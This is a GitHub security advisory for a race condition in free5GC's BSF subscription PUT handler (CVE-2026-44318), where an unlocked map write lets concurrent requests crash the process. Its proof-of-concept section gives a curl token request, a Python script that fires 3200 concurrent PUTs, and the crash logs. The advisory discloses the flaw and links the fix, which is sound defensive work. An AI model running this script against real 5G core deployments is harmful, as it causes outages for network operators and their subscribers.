# [M] free5GC's BSF concurrent PUT /nbsf-management/v1/subscriptions/{subId} crashes the BSF process via concurrent map read/write on Subscriptions

## Summary
Severity: Medium
Advisory: GHSA-27ph-8q4f-h7m7
CVE: CVE-2026-44318
CWE: CWE-362, CWE-820
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-27ph-8q4f-h7m7
Type: github-advisory

## Affected
- Go: `github.com/free5gc/bsf` — affected >=0 <1.0.2

## Details
### Summary
free5GC's BSF `PUT /nbsf-management/v1/subscriptions/{subId}` handler has an unsynchronized write on the global `Subscriptions` map. The handler first reads the map under `RLock()` via `BSFContext.GetSubscription(subId)`, but if the subscription does not exist, `ReplaceIndividualSubcription()` writes back to the same map directly without taking the mutex (`bsfContext.BsfSelf.Subscriptions[subId] = subscription`). Under concurrent authenticated PUT load, one goroutine can read while another writes the map, which causes the Go runtime to abort the process with `fatal error: concurrent map read and map write` (Go runtime panics that come from concurrent map access bypass `recover()` and terminate the process). The BSF container exits with code `2` -- the entire BSF SBI surface goes down until restart.

This endpoint requires a valid `nbsf-management` OAuth2 access token (PR:L, NOT PR:N), so this is scored as an authenticated process-kill DoS.

### Details
Validated against the BSF container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- Running Docker image: `free5gc/bsf:v4.2.1`
- Docker validation date: 2026-03-22
- BSF endpoint: `http://10.100.200.11:8000`

Read side (locked):
```go
func (c *BSFContext) GetSubscription(subId string) (*BsfSubscription, bool) {
    c.mutex.RLock()
    defer c.mutex.RUnlock()

    sub, exists := c.Subscriptions[subId]
    return sub, exists
}
```

Unsafe write side in the create-if-absent branch of `ReplaceIndividualSubcription` (no `Lock()`):
```go
subscription.SubId = subId
bsfContext.BsfSelf.Subscriptions[subId] = subscription
```

Under concurrent traffic, the Go runtime detects the unsynchronized read/write on `c.Subscriptions` and aborts the process. Go's `concurrent map read and map write` fatal is NOT a normal panic -- it is unrecoverable, Gin's recovery middleware does not catch it, and the BSF process terminates.

Code evidence (paths in `free5gc/bsf`):
- Read side (locked):
  - `NFs/bsf/internal/sbi/processor/subscriptions.go:81`
  - `NFs/bsf/internal/context/context.go:726`
  - `NFs/bsf/internal/context/context.go:730`
- Unsafe write side (the create-if-absent branch in PUT, no lock):
  - `NFs/bsf/internal/sbi/processor/subscriptions.go:111`
  - `NFs/bsf/internal/sbi/processor/subscriptions.go:114`

The normal locked helpers (`CreateSubscription()`, `GetSubscription()`, `UpdateSubscription()`, `DeleteSubscription()`) DO take the mutex correctly. The bug is specific to the inline write inside the PUT create-if-absent branch.

### PoC
Reproduced end-to-end against the running BSF at `http://10.100.200.11:8000`.

1. Obtain a valid `nbsf-management` token from NRF:
```
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=BSF&scope=nbsf-management'
```

2. Send concurrent PUT requests against fresh `subId` values (the validated lab uses 64 worker threads x 50 fresh subIds = 3200 concurrent PUTs):
```python
import json, threading, urllib.request

TOKEN = "<valid_nbsf_management_jwt>"
BASE = "http://10.100.200.11:8000/nbsf-management/v1"
PAYLOAD = json.dumps({
    "events": ["PCF_BINDING_CREATION"],
    "notifUri": "http://127.0.0.1/cb",
    "notifCorreId": "1",
    "supi": "imsi-208930000000003",
}).encode()

def send_put(i, n):
    url = f"{BASE}/subscriptions/race-mix-{i}-{n}"
    req = urllib.request.Request(url, data=PAYLOAD, method="PUT")
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    urllib.request.urlopen(req, timeout=2).read()

threads = []
for i in range(64):
    for n in range(50):
        threads.append(threading.Thread(target=send_put, args=(i, n)))
for t in threads: t.start()
for t in threads: t.join()
```

3. BSF container logs (`docker logs bsf`) show the Go runtime fatal that terminated the process:
```
[INFO][BSF][Proc] Handle ReplaceIndividualSubcription
fatal error: concurrent map read and map write
github.com/free5gc/bsf/internal/sbi/processor.ReplaceIndividualSubcription(0xc000514300)
    github.com/free5gc/bsf/internal/sbi/processor/subscriptions.go:81 +0x15f
```

4. Container state confirms exit code 2:
```
exited|2|0
```

### Impact
Unsynchronized concurrent access (CWE-362) to a shared map (`BsfSelf.Subscriptions`), combined with missing synchronization on the create-if-absent branch (CWE-820). Go's runtime detects concurrent map read/write and terminates the process via a non-recoverable fatal error -- Gin's `recover()` middleware does NOT catch this class of fatal, unlike ordinary nil-deref panics. The whole BSF process exits, dropping BSF's `nbsf-management` SBI surface (PCF binding lookups for SMF, AF -> PCF binding discovery, etc.) until restart.

Any party that holds (or can obtain) a valid `nbsf-management` token can:
- Drive the create-if-absent code path at high concurrency by PUTting a stream of fresh `subId` values, deterministically tripping the runtime fatal and killing the BSF process.
- Repeat the trigger after every restart to sustain the outage.

No Confidentiality impact (the crash returns no attacker-readable data). No persistent Integrity impact (BSF subscription state is in-memory and is lost when the process dies). The whole impact concentrates in Availability: complete loss of BSF service via concurrent attacker traffic on a single endpoint.

Affected: free5gc v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/926
Upstream fix: https://github.com/free5gc/bsf/pull/7

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-27ph-8q4f-h7m7
- https://nvd.nist.gov/vuln/detail/CVE-2026-44318
- https://github.com/free5gc/free5gc/issues/926
- https://github.com/free5gc/bsf/pull/7
- https://github.com/free5gc/bsf/commit/277908565fd628d974a13ef562b81a8b7b519ffa
- https://github.com/free5gc/free5gc
